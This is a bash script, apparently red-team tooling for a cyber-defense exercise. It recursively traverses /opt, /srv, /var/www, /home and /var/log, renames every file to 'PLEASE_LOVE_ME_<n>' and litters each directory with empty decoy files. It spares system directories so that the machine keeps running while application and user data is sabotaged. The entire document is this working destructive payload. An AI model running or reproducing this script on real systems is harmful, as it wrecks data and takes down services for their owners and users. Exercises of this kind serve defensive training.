#!/bin/bash

SKIP_DIRS=(
    /proc /sys /run /dev
    /bin /sbin
    /lib /lib64
    /boot /tmp
    /usr
    /etc
    /etc/systemd /etc/init.d
    /home/ubuntu/cdt-2026-redteam-tools
)

TARGET_DIRS=(
    /opt
    /srv
    /var/www
    /home
    /var/log
)

should_skip() {
    local target="${1%/}"
    for skip in "${SKIP_DIRS[@]}"; do
        [ "$target" = "$skip" ] && return 0
    done
    return 1
}

traverse() {
    local dir="$1"
    local depth="${2:-0}"

    [ "$depth" -gt 8 ] && return

    for entry in "$dir"/*/; do
        [ -d "$entry" ] || continue
        entry="${entry%/}"
        should_skip "$entry" && continue
        traverse "$entry" $((depth + 1))
        for i in {1..20}; do
            > "$entry/PLEASE_LOVE_ME_${i}"
        done
    done

    local count=50
    for file in "$dir"/*; do
        [ -f "$file" ] || continue
        mv "$file" "${file%/*}/PLEASE_LOVE_ME_${count}"
        ((count++))
    done
}

# Hit targets in order
for target in "${TARGET_DIRS[@]}"; do
    if [ -d "$target" ]; then
        echo "[*] Hitting $target"
        traverse "$target"
    else
        echo "[SKIP] $target does not exist"
    fi
done